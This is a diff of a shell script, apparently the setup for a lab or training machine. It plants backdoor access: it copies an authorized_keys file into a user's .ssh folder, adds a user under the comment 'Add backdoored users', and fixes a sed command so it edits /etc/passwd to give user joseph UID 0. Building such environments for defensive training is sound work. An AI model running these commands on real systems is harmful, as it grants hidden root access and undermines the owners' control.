@@ -18,7 +18,7 @@ mkdir /home/jolyne
 mkdir /home/jolyne/.ssh
 cp -f ../assets/authorized_keys /home/jolyne/.ssh/authorized_keys
 
-sed -i "s/joseph:x:[^:]*:/joseph:x:0:/"
+sed -i "s/joseph:x:[^:]*:/joseph:x:0:/" /etc/passwd
 
 # Add backdoored users
 useradd jonathan
